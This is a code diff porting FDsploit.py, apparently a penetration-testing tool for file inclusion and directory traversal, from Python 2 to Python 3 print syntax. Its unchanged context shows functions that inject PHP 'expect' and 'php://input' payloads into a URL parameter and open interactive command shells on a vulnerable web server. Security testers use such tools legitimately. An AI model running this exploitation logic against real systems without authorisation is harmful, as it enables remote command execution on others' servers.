@@ -6,8 +6,8 @@ __description__ = 'FDsploit.py: File inclusion & directory traversal fuzzer/enum
 __version__     = '1.2'
 
 import sys
-reload(sys)
-sys.setdefaultencoding("utf-8")
+import importlib
+importlib.reload(sys)
 from core.utils import *
 from core.colors import *
 warnings.filterwarnings("ignore")
@@ -15,7 +15,7 @@ warnings.filterwarnings("ignore")
 
 # make it also return a code positive/negative
 def test_php_expect(command, verb, url, param, cookie, proxy, parameters=None):
-    print '\n{}[*]{} Trying to execute commands with "expect"...'.format(BT, S)
+    print('\n{}[*]{} Trying to execute commands with "expect"...'.format(BT, S))
     if verb == "GET":
         ans1 = req(verb, inject(url, param, 'COMMAND'), cookie, proxy)
         ans2 = req(verb, inject(url, param, php_expect(command)), cookie, proxy)
@@ -26,26 +26,26 @@ def test_php_expect(command, verb, url, param, cookie, proxy, parameters=None):
         ans2 = req(verb, url, cookie, proxy, parameters)
     if hashpage(ans1.text) != hashpage(ans2.text):
         ret(.1)
-        print "{0}[+]{1} It's seems possible to be able to execute commands with 'expect'!".format(FG,S)
+        print("{0}[+]{1} It's seems possible to be able to execute commands with 'expect'!".format(FG,S))
         return 1
     else:
         ret(.1)
-        print "{0}[x]{1} It's seems it's NOT possible to execute commands with 'expect'!".format(FR,S)
+        print("{0}[x]{1} It's seems it's NOT possible to execute commands with 'expect'!".format(FR,S))
         return 0
 
 
 def test_php_input(command, verb, url, param, cookie, proxy):
     if verb == "GET":
-        print '{}[*]{} Trying to execute commands with "php://input"...'.format(BT, S)
+        print('{}[*]{} Trying to execute commands with "php://input"...'.format(BT, S))
         ans1 = req(verb, inject(url, param, 'COMMAND'), cookie, proxy)
         ans2 = req(verb, inject(url, param, 'php://input'), cookie, proxy, raw_data=php_input(command))
         if hashpage(ans1.text) != hashpage(ans2.text):
             ret(.1)
-            print "{0}[+]{1} It's seems possible to be able to execute commands with 'php://input'!".format(FG,S)
+            print("{0}[+]{1} It's seems possible to be able to execute commands with 'php://input'!".format(FG,S))
             return 1
         else:
             ret(.1)
-            print "{0}[x]{1} It's seems it's NOT possible to execute commands with 'php://input'!".format(FR,S)
+            print("{0}[x]{1} It's seems it's NOT possible to execute commands with 'php://input'!".format(FR,S))
             return 0
     else:
         pass
@@ -71,9 +71,9 @@ def simple_shell(verb, url, param, cookie, proxy, tchar, b64, uenc, parameters=N
                         res = req(verb, url, cookie, proxy, parameters)
                     if res.status_code == 200:
                         content = '\n'.join(line for line in lessHTML(res.text).splitlines() if line not in initial.splitlines())
-                        print '{0}\n{1}'.format((FG+'-'+S )* 50, content)
+                        print('{0}\n{1}'.format((FG+'-'+S )* 50, content))
                     else:
-                        print '{}[-] No such file!{}\n'.format(FR, S)
+                        print('{}[-] No such file!{}\n'.format(FR, S))
     except KeyboardInterrupt:
         sys.exit(0)
 
@@ -98,9 +98,9 @@ def expect_shell(verb, url, param, cookie, proxy, parameters=None):
                             res = req(verb, url, cookie, proxy, parameters)
                         if res.status_code == 200:
                             content = '\n'.join(line for line in lessHTML(res.text).splitlines() if line not in initial.splitlines())
-                            print '{0}\n{1}'.format((FG+'-'+S )* 50, content)
+                            print('{0}\n{1}'.format((FG+'-'+S )* 50, content))
                         else:
-                            print '{}[-] Something went wrong!{}\n'.format(FR, S)
+                            print('{}[-] Something went wrong!{}\n'.format(FR, S))
         else:
             sys.exit(0)
     except KeyboardInterrupt:
@@ -123,9 +123,9 @@ def input_shell(verb, url, param, cookie, proxy):
                         res = req(verb, inject(url, param, 'php://input'), cookie, proxy, raw_data=php_input(command))
                         if res.status_code == 200:
                             content = '\n'.join(line for line in lessHTML(res.text).splitlines() if line not in initial.splitlines())
-                            print '{0}\n{1}'.format((FG+'-'+S )* 50, content)
+                            print('{0}\n{1}'.format((FG+'-'+S )* 50, content))
                         else:
-                            print '{}[-] Something went wrong!{}\n'.format(FR, S)
+                            print('{}[-] Something went wrong!{}\n'.format(FR, S))
         else:
             sys.exit(0)
     except KeyboardInterrupt:
